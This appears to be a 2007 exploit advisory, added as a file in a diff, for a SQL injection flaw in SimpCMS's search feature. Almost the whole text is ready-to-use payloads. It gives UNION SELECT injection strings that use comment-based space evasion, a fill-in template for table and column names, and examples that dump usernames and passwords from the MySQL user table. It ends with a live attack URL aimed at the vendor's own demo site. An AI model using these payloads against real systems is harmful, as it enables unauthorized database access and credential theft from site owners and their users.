@@ -1,0 +1,58 @@
+SimpCMS <= all Remote SQL Injection Vulnerability
+
+
+Found By : ú Cold z3ro , http://www.hackteach.org/
+
+
+Script : http://www.simpcms.com/
+
+
+====================================
+
+Exploit :
+
+/index.php?site=search&keyword=1)'/**/union/**/select/**/0,1,2,3,name,5,6/**/from/**/categories/*
+
+OR
+
+/index.php?site=search
+
+in search area insert your query
+
+$query = 1)'/**/union/**/select/**/0,1,2,3,$COLUMN,5,6/**/from/**/$TABLE/*
+
+$TABLE = "categories" OR "news" OR "mysql.user" OR "mysql.db" OR 
+"information_schema.tables"
+
+$COLUMN = "name" OR "id" OR "username" OR "password"
+
+Examples :
+
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+1 ) From $TABLE categories :
+
+/index.php?site=search&keyword=1)'/**/union/**/select/**/0,1,2,3,name,5,6/**/from/**/categories/*
+
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+2 ) From $TABLE news :
+
+/index.php?site=search&keyword=1)'/**/union/**/select/**/0,1,2,3,id,5,6/**/from/**/news/*
+
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+3 ) From $TABLE mysql.user :
+
+/index.php?site=search&keyword=1)'/**/union/**/select/**/0,1,2,3,username,5,6/**/from/**/mysql.user/*
+/index.php?site=search&keyword=1)'/**/union/**/select/**/0,1,2,3,password,5,6/**/from/**/mysql.user/*
+
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+====================================
+
+Live Example :
+
+http://www.simpcms.com/medium/normal/index.php?site=search&keyword=1)'/**/union/**/select/**/0,user(),database(),3,name,5,6/**/from/**/categories/*
+
+# milw0rm.com [2007-09-16]
